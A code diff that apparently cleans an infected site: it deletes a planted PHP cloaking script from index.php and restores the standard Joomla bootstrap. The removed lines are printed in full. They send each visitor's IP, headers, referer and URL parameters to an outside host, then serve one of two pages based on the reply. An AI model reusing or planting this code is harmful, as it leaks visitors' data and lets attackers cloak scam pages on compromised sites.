@@ -1,32 +1,49 @@
-<?
- session_start();
- $post["ip"] = @$_SERVER["HTTP_CF_CONNECTING_IP"]? @$_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
- $post["domain"] = $_SERVER["HTTP_HOST"];
- $post["referer"] = @$_SERVER["HTTP_REFERER"];
- $post["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
- $post["headers"] = json_encode(apache_request_headers());
- // $post["land"] = 1; //раскомментировать на в индексном файле лендинга
+<?php
+/**
+ * @package    Joomla.Site
+ *
+ * @copyright  Copyright (C) 2005 - 2020 Open Source Matters, Inc. All rights reserved.
+ * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ */
 
- if($_GET)foreach($_GET as $key => $value) $_SESSION[$key] = $value;
- $post["utm"] = json_encode($_SESSION);
+/**
+ * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
+ */
+define('JOOMLA_MINIMUM_PHP', '5.3.10');
 
- $curl = curl_init("https://manyenergy.fun/api/check_ip");
- curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
- curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
- curl_setopt($curl, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
- curl_setopt($curl, CURLOPT_ENCODING, "");
- curl_setopt($curl, CURLOPT_TIMEOUT, 5);
- curl_setopt($curl, CURLOPT_POST, true);
- curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
+if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
+{
+	die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
+}
 
- $json_reqest = curl_exec($curl);
- curl_close($curl);
- $api_reqest = json_decode($json_reqest);
+// Saves the start time and memory usage.
+$startTime = microtime(1);
+$startMem  = memory_get_usage();
 
- if($api_reqest)foreach($api_reqest as $key => $value) $_SESSION[$key] = $value;
+/**
+ * Constant that is checked in included files to prevent direct access.
+ * define() is used in the installation folder rather than "const" to not error for PHP 5.2 and lower
+ */
+define('_JEXEC', 1);
 
-if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
-    require_once("w.php");
- }else{
-    require_once("brr.php");
- }
+if (file_exists(__DIR__ . '/defines.php'))
+{
+	include_once __DIR__ . '/defines.php';
+}
+
+if (!defined('_JDEFINES'))
+{
+	define('JPATH_BASE', __DIR__);
+	require_once JPATH_BASE . '/includes/defines.php';
+}
+
+require_once JPATH_BASE . '/includes/framework.php';
+
+// Set profiler start time and memory usage and mark afterLoad in the profiler.
+JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;
+
+// Instantiate the application.
+$app = JFactory::getApplication('site');
+
+// Execute the application.
+$app->execute();
